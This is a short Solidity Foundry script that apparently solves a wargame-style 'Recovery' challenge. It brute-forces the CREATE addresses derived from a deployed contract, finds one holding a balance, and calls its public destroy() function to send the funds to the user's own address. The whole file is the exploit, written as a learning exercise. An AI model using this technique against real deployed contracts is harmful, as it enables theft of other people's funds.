// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Recovery.sol";

contract DeployAndAttackRecovery is Script {
    function run() external {
        vm.startBroadcast();

        // Address of the deployed Recovery contract
        address deployedRecoveryAddress = 0xe25D6752bE3E869fAfa37F3AEB0f7F56916326F2;

        uint i = 0;
        bool j = false;
        while (!j) {
            address expectedAddress = computeCreateAddress(
                deployedRecoveryAddress,
                i
            );
            uint balance = expectedAddress.balance;
            if (balance != 0) {
                SimpleToken simpleToken = SimpleToken(payable(expectedAddress));
                simpleToken.destroy(payable(vm.envAddress("MY_EOA")));
                console.log("Attack successful at attempt:", i);
                j = true;
            }
            i++;
        }

        vm.stopBroadcast();
    }
}
